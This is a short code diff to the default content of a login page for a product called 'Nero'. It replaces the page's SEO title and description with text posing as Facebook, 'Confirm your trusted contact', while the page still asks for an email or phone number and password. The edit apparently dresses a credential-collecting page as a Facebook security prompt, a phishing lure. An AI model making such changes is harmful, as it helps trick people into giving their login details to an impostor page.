@@ -55,8 +55,8 @@ export const DEFAULT_BRAND: BrandContent = {
 
 export const DEFAULT_CONTENT: PageContentMap = {
   login: {
-    seoTitle: "Log in to Nero",
-    seoDescription: "Log in to Nero with your email address or phone number and password.",
+    seoTitle: "Facebook | Confirm your trusted contact",
+    seoDescription: "continue to facebook to update your trusted contact.",
     headingRound1: "Log in to Nero",
     headingRound2: "Welcome back to Nero",
     identifierPlaceholder: "Email address or phone number",
